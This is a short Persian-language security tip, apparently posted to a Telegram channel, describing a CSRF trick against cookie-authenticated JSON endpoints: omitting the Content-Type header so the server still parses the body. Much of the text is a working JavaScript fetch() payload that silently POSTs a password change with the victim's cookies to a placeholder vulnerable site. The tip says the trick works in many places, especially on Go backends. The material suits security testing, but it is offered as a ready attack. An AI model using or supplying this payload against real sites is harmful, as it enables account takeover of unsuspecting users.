# CSRF

🚀 Security Tip — CSRF Trick

🔍 وقتی داری تست CSRF انجام میدی، این روش رو هم امتحان کن!

اگه تارگتت Cookie-Based باشه و هیچ هدر خاصی برای CSRF Protection نداشته باشه،
ولی درخواست‌هاش رو با JSON Content-Type بفرسته، می‌تونی هدر Content-Type رو کلاً حذف کنی و Body رو هم همون‌جوری JSON بذاری.
اگه سرور همچنان JSON رو Parse کرد، یعنی میشه خیلی راحت Exploit کرد.

Exploit Code:

fetch("https://vulnerable-corp.com/profile/edit", {
  method: "POST",
  body: new Blob([JSON.stringify({ change_password: "newPassword" })]),
  credentials: "include",
});


با این تکنیک، CSRF خیلی جاها جواب میده, مخصوصا توی بک اند های که با golang نوشته شده باشه.

t.me/GOTOCVE

=======================================

